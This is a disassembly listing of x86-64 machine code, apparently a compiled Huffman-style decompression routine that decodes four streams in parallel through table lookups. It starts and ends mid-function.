   140004084:	48 d3 e2             	shl    %cl,%rdx
   140004087:	41 8b ce             	mov    %r14d,%ecx
   14000408a:	48 d3 ea             	shr    %cl,%rdx
   14000408d:	0f b7 44 96 04       	movzwl 0x4(%rsi,%rdx,4),%eax
   140004092:	66 41 89 00          	mov    %ax,(%r8)
   140004096:	44 0f b6 4c 96 06    	movzbl 0x6(%rsi,%rdx,4),%r9d
   14000409c:	45 03 ca             	add    %r10d,%r9d
   14000409f:	44 0f b6 54 96 07    	movzbl 0x7(%rsi,%rdx,4),%r10d
   1400040a5:	4d 03 d0             	add    %r8,%r10
   1400040a8:	41 8b c9             	mov    %r9d,%ecx
   1400040ab:	48 8b d7             	mov    %rdi,%rdx
   1400040ae:	48 d3 e2             	shl    %cl,%rdx
   1400040b1:	41 8b ce             	mov    %r14d,%ecx
   1400040b4:	48 d3 ea             	shr    %cl,%rdx
   1400040b7:	0f b7 44 96 04       	movzwl 0x4(%rsi,%rdx,4),%eax
   1400040bc:	66 41 89 02          	mov    %ax,(%r10)
   1400040c0:	44 0f b6 44 96 06    	movzbl 0x6(%rsi,%rdx,4),%r8d
   1400040c6:	44 0f b6 5c 96 07    	movzbl 0x7(%rsi,%rdx,4),%r11d
   1400040cc:	45 03 c1             	add    %r9d,%r8d
   1400040cf:	4d 03 da             	add    %r10,%r11
   1400040d2:	e9 d9 fe ff ff       	jmp    0x140003fb0
   1400040d7:	4c 8b 54 24 20       	mov    0x20(%rsp),%r10
   1400040dc:	4c 8b 64 24 68       	mov    0x68(%rsp),%r12
   1400040e1:	4d 8d 4a fe          	lea    -0x2(%r10),%r9
   1400040e5:	41 83 f8 40          	cmp    $0x40,%r8d
   1400040e9:	76 07                	jbe    0x1400040f2
   1400040eb:	ba 03 00 00 00       	mov    $0x3,%edx
   1400040f0:	eb 57                	jmp    0x140004149
   1400040f2:	49 3b df             	cmp    %r15,%rbx
   1400040f5:	72 12                	jb     0x140004109
   1400040f7:	41 8b c0             	mov    %r8d,%eax
   1400040fa:	41 83 e0 07          	and    $0x7,%r8d
   1400040fe:	48 c1 e8 03          	shr    $0x3,%rax
   140004102:	48 2b d8             	sub    %rax,%rbx
   140004105:	33 d2                	xor    %edx,%edx
   140004107:	eb 3d                	jmp    0x140004146
   140004109:	48 3b dd             	cmp    %rbp,%rbx
   14000410c:	75 0b                	jne    0x140004119
   14000410e:	41 83 f8 40          	cmp    $0x40,%r8d
   140004112:	1b d2                	sbb    %edx,%edx
   140004114:	83 c2 02             	add    $0x2,%edx
   140004117:	eb 30                	jmp    0x140004149
   140004119:	41 8b c8             	mov    %r8d,%ecx
   14000411c:	48 8b c3             	mov    %rbx,%rax
   14000411f:	c1 e9 03             	shr    $0x3,%ecx
   140004122:	48 2b c1             	sub    %rcx,%rax
   140004125:	48 3b c5             	cmp    %rbp,%rax
   140004128:	73 0b                	jae    0x140004135
   14000412a:	8b cb                	mov    %ebx,%ecx
   14000412c:	ba 01 00 00 00       	mov    $0x1,%edx
   140004131:	2b cd                	sub    %ebp,%ecx
   140004133:	eb 02                	jmp    0x140004137
   140004135:	33 d2                	xor    %edx,%edx
   140004137:	8b c1                	mov    %ecx,%eax
   140004139:	48 2b d8             	sub    %rax,%rbx
   14000413c:	8d 04 cd 00 00 00 00 	lea    0x0(,%rcx,8),%eax
   140004143:	44 2b c0             	sub    %eax,%r8d
   140004146:	48 8b 3b             	mov    (%rbx),%rdi
   140004149:	33 c9                	xor    %ecx,%ecx
   14000414b:	4d 3b d9             	cmp    %r9,%r11
   14000414e:	0f 96 c1             	setbe  %cl
   140004151:	33 c0                	xor    %eax,%eax
   140004153:	85 d2                	test   %edx,%edx
   140004155:	0f 94 c0             	sete   %al
   140004158:	85 c8                	test   %ecx,%eax
   14000415a:	74 2d                	je     0x140004189
   14000415c:	41 8b c8             	mov    %r8d,%ecx
   14000415f:	48 8b d7             	mov    %rdi,%rdx
   140004162:	48 d3 e2             	shl    %cl,%rdx
   140004165:	41 8b ce             	mov    %r14d,%ecx
   140004168:	48 d3 ea             	shr    %cl,%rdx
   14000416b:	0f b7 44 96 04       	movzwl 0x4(%rsi,%rdx,4),%eax
   140004170:	66 41 89 03          	mov    %ax,(%r11)
   140004174:	0f b6 44 96 06       	movzbl 0x6(%rsi,%rdx,4),%eax
   140004179:	44 03 c0             	add    %eax,%r8d
   14000417c:	0f b6 44 96 07       	movzbl 0x7(%rsi,%rdx,4),%eax
   140004181:	4c 03 d8             	add    %rax,%r11
   140004184:	e9 5c ff ff ff       	jmp    0x1400040e5
   140004189:	4c 8b 7c 24 50       	mov    0x50(%rsp),%r15
   14000418e:	4d 3b d9             	cmp    %r9,%r11
   140004191:	77 3a                	ja     0x1400041cd
   140004193:	0f 1f 40 00          	nopl   0x0(%rax)
   140004197:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000419e:	00 00 
   1400041a0:	41 8b c8             	mov    %r8d,%ecx
   1400041a3:	48 8b d7             	mov    %rdi,%rdx
   1400041a6:	48 d3 e2             	shl    %cl,%rdx
   1400041a9:	41 8b ce             	mov    %r14d,%ecx
   1400041ac:	48 d3 ea             	shr    %cl,%rdx
   1400041af:	0f b7 44 96 04       	movzwl 0x4(%rsi,%rdx,4),%eax
   1400041b4:	66 41 89 03          	mov    %ax,(%r11)
   1400041b8:	0f b6 44 96 06       	movzbl 0x6(%rsi,%rdx,4),%eax
   1400041bd:	44 03 c0             	add    %eax,%r8d
   1400041c0:	0f b6 44 96 07       	movzbl 0x7(%rsi,%rdx,4),%eax
   1400041c5:	4c 03 d8             	add    %rax,%r11
   1400041c8:	4d 3b d9             	cmp    %r9,%r11
   1400041cb:	76 d3                	jbe    0x1400041a0
   1400041cd:	4c 8b 74 24 58       	mov    0x58(%rsp),%r14
   1400041d2:	4d 3b da             	cmp    %r10,%r11
   1400041d5:	73 47                	jae    0x14000421e
   1400041d7:	41 f7 dd             	neg    %r13d
   1400041da:	41 8b c8             	mov    %r8d,%ecx
   1400041dd:	48 d3 e7             	shl    %cl,%rdi
   1400041e0:	41 83 e5 3f          	and    $0x3f,%r13d
   1400041e4:	41 0f b6 cd          	movzbl %r13b,%ecx
   1400041e8:	48 d3 ef             	shr    %cl,%rdi
   1400041eb:	0f b6 44 be 04       	movzbl 0x4(%rsi,%rdi,4),%eax
   1400041f0:	41 88 03             	mov    %al,(%r11)
   1400041f3:	80 7c be 07 01       	cmpb   $0x1,0x7(%rsi,%rdi,4)
   1400041f8:	75 0a                	jne    0x140004204
   1400041fa:	0f b6 44 be 06       	movzbl 0x6(%rsi,%rdi,4),%eax
   1400041ff:	44 03 c0             	add    %eax,%r8d
   140004202:	eb 1a                	jmp    0x14000421e
   140004204:	41 83 f8 40          	cmp    $0x40,%r8d
   140004208:	73 14                	jae    0x14000421e
   14000420a:	0f b6 44 be 06       	movzbl 0x6(%rsi,%rdi,4),%eax
   14000420f:	44 03 c0             	add    %eax,%r8d
   140004212:	b8 40 00 00 00       	mov    $0x40,%eax
   140004217:	44 3b c0             	cmp    %eax,%r8d
   14000421a:	44 0f 47 c0          	cmova  %eax,%r8d
   14000421e:	4c 8b 6c 24 60       	mov    0x60(%rsp),%r13
   140004223:	48 3b dd             	cmp    %rbp,%rbx
   140004226:	48 8b ac 24 80 00 00 	mov    0x80(%rsp),%rbp
   14000422d:	00 
   14000422e:	48 8b bc 24 98 00 00 	mov    0x98(%rsp),%rdi
   140004235:	00 
   140004236:	48 8b b4 24 90 00 00 	mov    0x90(%rsp),%rsi
   14000423d:	00 
   14000423e:	75 0e                	jne    0x14000424e
   140004240:	48 8b 84 24 88 00 00 	mov    0x88(%rsp),%rax
   140004247:	00 
   140004248:	41 83 f8 40          	cmp    $0x40,%r8d
   14000424c:	74 07                	je     0x140004255
   14000424e:	48 c7 c0 ec ff ff ff 	mov    $0xffffffffffffffec,%rax
   140004255:	48 83 c4 70          	add    $0x70,%rsp
   140004259:	5b                   	pop    %rbx
   14000425a:	c3                   	ret
   14000425b:	cc                   	int3
   14000425c:	cc                   	int3
   14000425d:	cc                   	int3
   14000425e:	cc                   	int3
   14000425f:	cc                   	int3
   140004260:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   140004265:	55                   	push   %rbp
   140004266:	57                   	push   %rdi
   140004267:	48 8d 6c 24 d8       	lea    -0x28(%rsp),%rbp
   14000426c:	48 81 ec 28 01 00 00 	sub    $0x128,%rsp
   140004273:	48 8b f9             	mov    %rcx,%rdi
   140004276:	49 83 f9 0a          	cmp    $0xa,%r9
   14000427a:	73 11                	jae    0x14000428d
   14000427c:	48 c7 c0 ec ff ff ff 	mov    $0xffffffffffffffec,%rax
   140004283:	48 81 c4 28 01 00 00 	add    $0x128,%rsp
   14000428a:	5f                   	pop    %rdi
   14000428b:	5d                   	pop    %rbp
   14000428c:	c3                   	ret
   14000428d:	48 89 b4 24 20 01 00 	mov    %rsi,0x120(%rsp)
   140004294:	00 
   140004295:	41 0f b7 70 04       	movzwl 0x4(%r8),%esi
   14000429a:	4c 89 ac 24 10 01 00 	mov    %r13,0x110(%rsp)
   1400042a1:	00 
   1400042a2:	4d 8b e9             	mov    %r9,%r13
   1400042a5:	4c 2b ee             	sub    %rsi,%r13
   1400042a8:	4c 89 b4 24 08 01 00 	mov    %r14,0x108(%rsp)
   1400042af:	00 
   1400042b0:	45 0f b7 30          	movzwl (%r8),%r14d
   1400042b4:	4c 89 bc 24 00 01 00 	mov    %r15,0x100(%rsp)
   1400042bb:	00 
   1400042bc:	45 0f b7 78 02       	movzwl 0x2(%r8),%r15d
   1400042c1:	4d 2b ef             	sub    %r15,%r13
   1400042c4:	4d 2b ee             	sub    %r14,%r13
   1400042c7:	49 83 c5 fa          	add    $0xfffffffffffffffa,%r13
   1400042cb:	4d 3b e9             	cmp    %r9,%r13
   1400042ce:	76 0c                	jbe    0x1400042dc
   1400042d0:	48 c7 c0 ec ff ff ff 	mov    $0xffffffffffffffec,%rax
   1400042d7:	e9 0f 0e 00 00       	jmp    0x1400050eb
   1400042dc:	49 8d 40 06          	lea    0x6(%r8),%rax
   1400042e0:	48 89 9c 24 40 01 00 	mov    %rbx,0x140(%rsp)
   1400042e7:	00 
   1400042e8:	48 8b 5d 60          	mov    0x60(%rbp),%rbx
   1400042ec:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400042f1:	4c 89 a4 24 18 01 00 	mov    %r12,0x118(%rsp)
   1400042f8:	00 
   1400042f9:	4d 8b c6             	mov    %r14,%r8
   1400042fc:	48 8b d0             	mov    %rax,%rdx
   1400042ff:	48 89 45 58          	mov    %rax,0x58(%rbp)
   140004303:	44 8b 23             	mov    (%rbx),%r12d
   140004306:	e8 15 ce ff ff       	call   0x140001120
   14000430b:	48 83 f8 88          	cmp    $0xffffffffffffff88,%rax
   14000430f:	0f 87 c6 0d 00 00    	ja     0x1400050db
   140004315:	4c 03 75 58          	add    0x58(%rbp),%r14
   140004319:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   14000431e:	49 8b d6             	mov    %r14,%rdx
   140004321:	4d 8b c7             	mov    %r15,%r8
   140004324:	e8 f7 cd ff ff       	call   0x140001120
   140004329:	48 83 f8 88          	cmp    $0xffffffffffffff88,%rax
   14000432d:	0f 87 a8 0d 00 00    	ja     0x1400050db
   140004333:	4d 03 f7             	add    %r15,%r14
   140004336:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   14000433b:	49 8b d6             	mov    %r14,%rdx
   14000433e:	4c 8b c6             	mov    %rsi,%r8
   140004341:	e8 da cd ff ff       	call   0x140001120
   140004346:	48 83 f8 88          	cmp    $0xffffffffffffff88,%rax
   14000434a:	0f 87 8b 0d 00 00    	ja     0x1400050db
   140004350:	4a 8d 14 36          	lea    (%rsi,%r14,1),%rdx
   140004354:	4d 8b c5             	mov    %r13,%r8
   140004357:	48 8d 4d 98          	lea    -0x68(%rbp),%rcx
   14000435b:	e8 c0 cd ff ff       	call   0x140001120
   140004360:	48 83 f8 88          	cmp    $0xffffffffffffff88,%rax
   140004364:	0f 87 71 0d 00 00    	ja     0x1400050db
   14000436a:	48 8b 45 48          	mov    0x48(%rbp),%rax
   14000436e:	41 bd 3f 00 00 00    	mov    $0x3f,%r13d
   140004374:	41 c1 ec 10          	shr    $0x10,%r12d
   140004378:	45 0f b6 e4          	movzbl %r12b,%r12d
   14000437c:	44 89 65 68          	mov    %r12d,0x68(%rbp)
   140004380:	4c 8d 04 07          	lea    (%rdi,%rax,1),%r8
   140004384:	48 83 c0 03          	add    $0x3,%rax
   140004388:	48 c1 e8 02          	shr    $0x2,%rax
   14000438c:	4c 89 45 f8          	mov    %r8,-0x8(%rbp)
   140004390:	49 83 c0 f9          	add    $0xfffffffffffffff9,%r8
   140004394:	48 8d 0c 38          	lea    (%rax,%rdi,1),%rcx
   140004398:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
   14000439c:	48 89 4d e8          	mov    %rcx,-0x18(%rbp)
   1400043a0:	4c 8d 0c 02          	lea    (%rdx,%rax,1),%r9
   1400043a4:	48 89 55 d8          	mov    %rdx,-0x28(%rbp)
   1400043a8:	41 8b c5             	mov    %r13d,%eax
   1400043ab:	4c 89 4d e0          	mov    %r9,-0x20(%rbp)
   1400043af:	41 2b c4             	sub    %r12d,%eax
   1400043b2:	4c 89 4d c8          	mov    %r9,-0x38(%rbp)
   1400043b6:	89 45 c0             	mov    %eax,-0x40(%rbp)
   1400043b9:	4c 8b f9             	mov    %rcx,%r15
   1400043bc:	4c 8b f2             	mov    %rdx,%r14
   1400043bf:	49 8b f1             	mov    %r9,%rsi
   1400043c2:	4d 3b c8             	cmp    %r8,%r9
   1400043c5:	0f 83 2b 03 00 00    	jae    0x1400046f6
   1400043cb:	44 8d 58 01          	lea    0x1(%rax),%r11d
   1400043cf:	41 f7 dc             	neg    %r12d
   1400043d2:	45 23 dd             	and    %r13d,%r11d
   1400043d5:	45 23 e5             	and    %r13d,%r12d
   1400043d8:	44 89 5d 58          	mov    %r11d,0x58(%rbp)
   1400043dc:	4d 8b e8             	mov    %r8,%r13
   1400043df:	90                   	nop
   1400043e0:	8b 4c 24 28          	mov    0x28(%rsp),%ecx
   1400043e4:	48 8b 54 24 20       	mov    0x20(%rsp),%rdx
   1400043e9:	48 d3 e2             	shl    %cl,%rdx
   1400043ec:	41 8b cb             	mov    %r11d,%ecx
   1400043ef:	48 d3 ea             	shr    %cl,%rdx
   1400043f2:	0f b7 44 93 04       	movzwl 0x4(%rbx,%rdx,4),%eax
   1400043f7:	66 89 07             	mov    %ax,(%rdi)
   1400043fa:	0f b6 44 93 06       	movzbl 0x6(%rbx,%rdx,4),%eax
   1400043ff:	44 0f b6 44 93 07    	movzbl 0x7(%rbx,%rdx,4),%r8d
   140004405:	01 44 24 28          	add    %eax,0x28(%rsp)
   140004409:	4c 03 c7             	add    %rdi,%r8
   14000440c:	8b 4c 24 50          	mov    0x50(%rsp),%ecx
   140004410:	48 8b 54 24 48       	mov    0x48(%rsp),%rdx
   140004415:	48 d3 e2             	shl    %cl,%rdx
   140004418:	41 8b cb             	mov    %r11d,%ecx
   14000441b:	48 d3 ea             	shr    %cl,%rdx
   14000441e:	0f b7 44 93 04       	movzwl 0x4(%rbx,%rdx,4),%eax
   140004423:	66 41 89 07          	mov    %ax,(%r15)
   140004427:	0f b6 44 93 06       	movzbl 0x6(%rbx,%rdx,4),%eax
   14000442c:	44 0f b6 4c 93 07    	movzbl 0x7(%rbx,%rdx,4),%r9d
   140004432:	01 44 24 50          	add    %eax,0x50(%rsp)
   140004436:	4d 03 cf             	add    %r15,%r9
   140004439:	8b 4c 24 78          	mov    0x78(%rsp),%ecx
   14000443d:	48 8b 54 24 70       	mov    0x70(%rsp),%rdx
   140004442:	48 d3 e2             	shl    %cl,%rdx
   140004445:	41 8b cb             	mov    %r11d,%ecx
   140004448:	48 d3 ea             	shr    %cl,%rdx
   14000444b:	0f b7 44 93 04       	movzwl 0x4(%rbx,%rdx,4),%eax
   140004450:	66 41 89 06          	mov    %ax,(%r14)
   140004454:	0f b6 44 93 06       	movzbl 0x6(%rbx,%rdx,4),%eax
   140004459:	44 0f b6 54 93 07    	movzbl 0x7(%rbx,%rdx,4),%r10d
   14000445f:	01 44 24 78          	add    %eax,0x78(%rsp)
   140004463:	4d 03 d6             	add    %r14,%r10
   140004466:	8b 4d a0             	mov    -0x60(%rbp),%ecx
   140004469:	48 8b 55 98          	mov    -0x68(%rbp),%rdx
   14000446d:	48 d3 e2             	shl    %cl,%rdx
   140004470:	41 8b cb             	mov    %r11d,%ecx
   140004473:	48 d3 ea             	shr    %cl,%rdx
   140004476:	0f b7 44 93 04       	movzwl 0x4(%rbx,%rdx,4),%eax
   14000447b:	66 89 06             	mov    %ax,(%rsi)
   14000447e:	0f b6 44 93 06       	movzbl 0x6(%rbx,%rdx,4),%eax
   140004483:	44 0f b6 5c 93 07    	movzbl 0x7(%rbx,%rdx,4),%r11d
   140004489:	01 45 a0             	add    %eax,-0x60(%rbp)
   14000448c:	4c 03 de             	add    %rsi,%r11
   14000448f:	8b 4c 24 28          	mov    0x28(%rsp),%ecx
   140004493:	48 8b 54 24 20       	mov    0x20(%rsp),%rdx
   140004498:	48 d3 e2             	shl    %cl,%rdx
   14000449b:	41 8b cc             	mov    %r12d,%ecx
   14000449e:	48 d3 ea             	shr    %cl,%rdx
   1400044a1:	0f b7 44 93 04       	movzwl 0x4(%rbx,%rdx,4),%eax
   1400044a6:	66 41 89 00          	mov    %ax,(%r8)
   1400044aa:	0f b6 44 93 06       	movzbl 0x6(%rbx,%rdx,4),%eax
   1400044af:	01 44 24 28          	add    %eax,0x28(%rsp)
   1400044b3:	0f b6 44 93 07       	movzbl 0x7(%rbx,%rdx,4),%eax
   1400044b8:	8b 4c 24 50          	mov    0x50(%rsp),%ecx
   1400044bc:	4c 03 c0             	add    %rax,%r8
   1400044bf:	48 8b 54 24 48       	mov    0x48(%rsp),%rdx
   1400044c4:	48 d3 e2             	shl    %cl,%rdx
   1400044c7:	41 8b cc             	mov    %r12d,%ecx
   1400044ca:	48 d3 ea             	shr    %cl,%rdx
   1400044cd:	0f b7 44 93 04       	movzwl 0x4(%rbx,%rdx,4),%eax
   1400044d2:	66 41 89 01          	mov    %ax,(%r9)
   1400044d6:	0f b6 44 93 06       	movzbl 0x6(%rbx,%rdx,4),%eax
   1400044db:	01 44 24 50          	add    %eax,0x50(%rsp)
   1400044df:	0f b6 44 93 07       	movzbl 0x7(%rbx,%rdx,4),%eax
   1400044e4:	8b 4c 24 78          	mov    0x78(%rsp),%ecx
   1400044e8:	4c 03 c8             	add    %rax,%r9
   1400044eb:	48 8b 54 24 70       	mov    0x70(%rsp),%rdx
   1400044f0:	48 d3 e2             	shl    %cl,%rdx
   1400044f3:	41 8b cc             	mov    %r12d,%ecx
   1400044f6:	48 d3 ea             	shr    %cl,%rdx
   1400044f9:	0f b7 44 93 04       	movzwl 0x4(%rbx,%rdx,4),%eax
   1400044fe:	66 41 89 02          	mov    %ax,(%r10)
   140004502:	0f b6 44 93 06       	movzbl 0x6(%rbx,%rdx,4),%eax
   140004507:	01 44 24 78          	add    %eax,0x78(%rsp)
   14000450b:	0f b6 44 93 07       	movzbl 0x7(%rbx,%rdx,4),%eax
   140004510:	8b 4d a0             	mov    -0x60(%rbp),%ecx
   140004513:	4c 03 d0             	add    %rax,%r10
   140004516:	48 8b 55 98          	mov    -0x68(%rbp),%rdx
   14000451a:	48 d3 e2             	shl    %cl,%rdx
   14000451d:	41 8b cc             	mov    %r12d,%ecx
   140004520:	48 d3 ea             	shr    %cl,%rdx
   140004523:	8b 75 58             	mov    0x58(%rbp),%esi
   140004526:	0f b7 44 93 04       	movzwl 0x4(%rbx,%rdx,4),%eax
   14000452b:	66 41 89 03          	mov    %ax,(%r11)
   14000452f:	0f b6 44 93 06       	movzbl 0x6(%rbx,%rdx,4),%eax
   140004534:	01 45 a0             	add    %eax,-0x60(%rbp)
   140004537:	0f b6 44 93 07       	movzbl 0x7(%rbx,%rdx,4),%eax
   14000453c:	8b 4c 24 28          	mov    0x28(%rsp),%ecx
   140004540:	4c 03 d8             	add    %rax,%r11
   140004543:	48 8b 54 24 20       	mov    0x20(%rsp),%rdx
   140004548:	48 d3 e2             	shl    %cl,%rdx
   14000454b:	41 8b cc             	mov    %r12d,%ecx
   14000454e:	48 d3 ea             	shr    %cl,%rdx
   140004551:	0f b7 44 93 04       	movzwl 0x4(%rbx,%rdx,4),%eax
   140004556:	66 41 89 00          	mov    %ax,(%r8)
   14000455a:	0f b6 44 93 06       	movzbl 0x6(%rbx,%rdx,4),%eax
   14000455f:	01 44 24 28          	add    %eax,0x28(%rsp)
   140004563:	0f b6 44 93 07       	movzbl 0x7(%rbx,%rdx,4),%eax
   140004568:	8b 4c 24 50          	mov    0x50(%rsp),%ecx
   14000456c:	4c 03 c0             	add    %rax,%r8
   14000456f:	48 8b 54 24 48       	mov    0x48(%rsp),%rdx
   140004574:	48 d3 e2             	shl    %cl,%rdx
   140004577:	41 8b cc             	mov    %r12d,%ecx
   14000457a:	48 d3 ea             	shr    %cl,%rdx
   14000457d:	0f b7 44 93 04       	movzwl 0x4(%rbx,%rdx,4),%eax
   140004582:	66 41 89 01          	mov    %ax,(%r9)
   140004586:	0f b6 44 93 06       	movzbl 0x6(%rbx,%rdx,4),%eax
   14000458b:	01 44 24 50          	add    %eax,0x50(%rsp)
   14000458f:	0f b6 44 93 07       	movzbl 0x7(%rbx,%rdx,4),%eax
   140004594:	8b 4c 24 78          	mov    0x78(%rsp),%ecx
   140004598:	4c 03 c8             	add    %rax,%r9
   14000459b:	48 8b 54 24 70       	mov    0x70(%rsp),%rdx
   1400045a0:	48 d3 e2             	shl    %cl,%rdx
   1400045a3:	41 8b cc             	mov    %r12d,%ecx
   1400045a6:	48 d3 ea             	shr    %cl,%rdx
   1400045a9:	0f b7 44 93 04       	movzwl 0x4(%rbx,%rdx,4),%eax
   1400045ae:	66 41 89 02          	mov    %ax,(%r10)
   1400045b2:	0f b6 44 93 06       	movzbl 0x6(%rbx,%rdx,4),%eax
   1400045b7:	01 44 24 78          	add    %eax,0x78(%rsp)
   1400045bb:	0f b6 44 93 07       	movzbl 0x7(%rbx,%rdx,4),%eax
   1400045c0:	8b 4d a0             	mov    -0x60(%rbp),%ecx
   1400045c3:	4c 03 d0             	add    %rax,%r10
   1400045c6:	48 8b 55 98          	mov    -0x68(%rbp),%rdx
   1400045ca:	48 d3 e2             	shl    %cl,%rdx
   1400045cd:	8b ce                	mov    %esi,%ecx
   1400045cf:	48 d3 ea             	shr    %cl,%rdx
   1400045d2:	0f b7 44 93 04       	movzwl 0x4(%rbx,%rdx,4),%eax
   1400045d7:	66 41 89 03          	mov    %ax,(%r11)
   1400045db:	0f b6 44 93 06       	movzbl 0x6(%rbx,%rdx,4),%eax
   1400045e0:	01 45 a0             	add    %eax,-0x60(%rbp)
   1400045e3:	0f b6 44 93 07       	movzbl 0x7(%rbx,%rdx,4),%eax
   1400045e8:	8b 4c 24 28          	mov    0x28(%rsp),%ecx
   1400045ec:	4c 03 d8             	add    %rax,%r11
   1400045ef:	48 8b 54 24 20       	mov    0x20(%rsp),%rdx
   1400045f4:	48 d3 e2             	shl    %cl,%rdx
   1400045f7:	8b ce                	mov    %esi,%ecx
   1400045f9:	48 d3 ea             	shr    %cl,%rdx
   1400045fc:	0f b7 44 93 04       	movzwl 0x4(%rbx,%rdx,4),%eax
   140004601:	66 41 89 00          	mov    %ax,(%r8)
   140004605:	0f b6 44 93 06       	movzbl 0x6(%rbx,%rdx,4),%eax
   14000460a:	0f b6 7c 93 07       	movzbl 0x7(%rbx,%rdx,4),%edi
   14000460f:	01 44 24 28          	add    %eax,0x28(%rsp)
   140004613:	49 03 f8             	add    %r8,%rdi
   140004616:	8b 4c 24 50          	mov    0x50(%rsp),%ecx
   14000461a:	48 8b 54 24 48       	mov    0x48(%rsp),%rdx
   14000461f:	48 d3 e2             	shl    %cl,%rdx
   140004622:	8b ce                	mov    %esi,%ecx
   140004624:	48 d3 ea             	shr    %cl,%rdx
   140004627:	0f b7 44 93 04       	movzwl 0x4(%rbx,%rdx,4),%eax
   14000462c:	66 41 89 01          	mov    %ax,(%r9)
   140004630:	0f b6 44 93 06       	movzbl 0x6(%rbx,%rdx,4),%eax
   140004635:	44 0f b6 7c 93 07    	movzbl 0x7(%rbx,%rdx,4),%r15d
   14000463b:	8b 4c 24 78          	mov    0x78(%rsp),%ecx
   14000463f:	4d 03 f9             	add    %r9,%r15
   140004642:	01 44 24 50          	add    %eax,0x50(%rsp)
   140004646:	48 8b 54 24 70       	mov    0x70(%rsp),%rdx
   14000464b:	48 d3 e2             	shl    %cl,%rdx
   14000464e:	8b ce                	mov    %esi,%ecx
   140004650:	48 d3 ea             	shr    %cl,%rdx
   140004653:	0f b7 44 93 04       	movzwl 0x4(%rbx,%rdx,4),%eax
   140004658:	66 41 89 02          	mov    %ax,(%r10)
   14000465c:	0f b6 44 93 06       	movzbl 0x6(%rbx,%rdx,4),%eax
   140004661:	44 0f b6 74 93 07    	movzbl 0x7(%rbx,%rdx,4),%r14d
   140004667:	8b 4d a0             	mov    -0x60(%rbp),%ecx
   14000466a:	4d 03 f2             	add    %r10,%r14
   14000466d:	01 44 24 78          	add    %eax,0x78(%rsp)
   140004671:	48 8b 55 98          	mov    -0x68(%rbp),%rdx
   140004675:	48 d3 e2             	shl    %cl,%rdx
   140004678:	8b ce                	mov    %esi,%ecx
   14000467a:	48 d3 ea             	shr    %cl,%rdx
   14000467d:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140004682:	0f b7 44 93 04       	movzwl 0x4(%rbx,%rdx,4),%eax
   140004687:	66 41 89 03          	mov    %ax,(%r11)
   14000468b:	0f b6 44 93 06       	movzbl 0x6(%rbx,%rdx,4),%eax
   140004690:	0f b6 74 93 07       	movzbl 0x7(%rbx,%rdx,4),%esi
   140004695:	01 45 a0             	add    %eax,-0x60(%rbp)
   140004698:	49 03 f3             	add    %r11,%rsi
   14000469b:	e8 e0 cb ff ff       	call   0x140001280
   1400046a0:	85 c0                	test   %eax,%eax
   1400046a2:	75 36                	jne    0x1400046da
   1400046a4:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   1400046a9:	e8 d2 cb ff ff       	call   0x140001280
   1400046ae:	85 c0                	test   %eax,%eax
   1400046b0:	75 28                	jne    0x1400046da
   1400046b2:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   1400046b7:	e8 c4 cb ff ff       	call   0x140001280
   1400046bc:	85 c0                	test   %eax,%eax
   1400046be:	75 1a                	jne    0x1400046da
   1400046c0:	48 8d 4d 98          	lea    -0x68(%rbp),%rcx
   1400046c4:	e8 b7 cb ff ff       	call   0x140001280
   1400046c9:	85 c0                	test   %eax,%eax
   1400046cb:	75 0d                	jne    0x1400046da
   1400046cd:	44 8b 5d 58          	mov    0x58(%rbp),%r11d
   1400046d1:	49 3b f5             	cmp    %r13,%rsi
   1400046d4:	0f 82 06 fd ff ff    	jb     0x1400043e0
   1400046da:	44 8b 65 68          	mov    0x68(%rbp),%r12d
   1400046de:	41 bd 3f 00 00 00    	mov    $0x3f,%r13d
   1400046e4:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   1400046e8:	48 8b 55 d8          	mov    -0x28(%rbp),%rdx
   1400046ec:	4c 8b 4d e0          	mov    -0x20(%rbp),%r9
   1400046f0:	48 89 75 c8          	mov    %rsi,-0x38(%rbp)
   1400046f4:	eb 03                	jmp    0x1400046f9
   1400046f6:	89 45 c0             	mov    %eax,-0x40(%rbp)
   1400046f9:	48 3b f9             	cmp    %rcx,%rdi
   1400046fc:	77 0a                	ja     0x140004708
   1400046fe:	4c 3b fa             	cmp    %rdx,%r15
   140004701:	77 05                	ja     0x140004708
   140004703:	4d 3b f1             	cmp    %r9,%r14
   140004706:	76 0c                	jbe    0x140004714
   140004708:	48 c7 c0 ec ff ff ff 	mov    $0xffffffffffffffec,%rax
   14000470f:	e9 c7 09 00 00       	jmp    0x1400050db
   140004714:	48 8d 41 f9          	lea    -0x7(%rcx),%rax
   140004718:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000471d:	48 89 45 d0          	mov    %rax,-0x30(%rbp)
   140004721:	e8 9a cb ff ff       	call   0x1400012c0
   140004726:	33 c9                	xor    %ecx,%ecx
   140004728:	85 c0                	test   %eax,%eax
   14000472a:	0f 94 c1             	sete   %cl
   14000472d:	33 c0                	xor    %eax,%eax
   14000472f:	48 3b 7d d0          	cmp    -0x30(%rbp),%rdi
   140004733:	0f 92 c0             	setb   %al
   140004736:	85 c8                	test   %ecx,%eax
   140004738:	0f 84 09 01 00 00    	je     0x140004847
   14000473e:	8b 45 c0             	mov    -0x40(%rbp),%eax
   140004741:	45 8b ec             	mov    %r12d,%r13d
   140004744:	48 8b 75 d0          	mov    -0x30(%rbp),%rsi
   140004748:	ff c0                	inc    %eax
   14000474a:	83 e0 3f             	and    $0x3f,%eax
   14000474d:	41 f7 dd             	neg    %r13d
   140004750:	41 83 e5 3f          	and    $0x3f,%r13d
   140004754:	44 8b e0             	mov    %eax,%r12d
   140004757:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000475e:	00 00 
   140004760:	8b 4c 24 28          	mov    0x28(%rsp),%ecx
   140004764:	48 8b 54 24 20       	mov    0x20(%rsp),%rdx
   140004769:	48 d3 e2             	shl    %cl,%rdx
   14000476c:	41 8b cc             	mov    %r12d,%ecx
   14000476f:	48 d3 ea             	shr    %cl,%rdx
   140004772:	0f b7 44 93 04       	movzwl 0x4(%rbx,%rdx,4),%eax
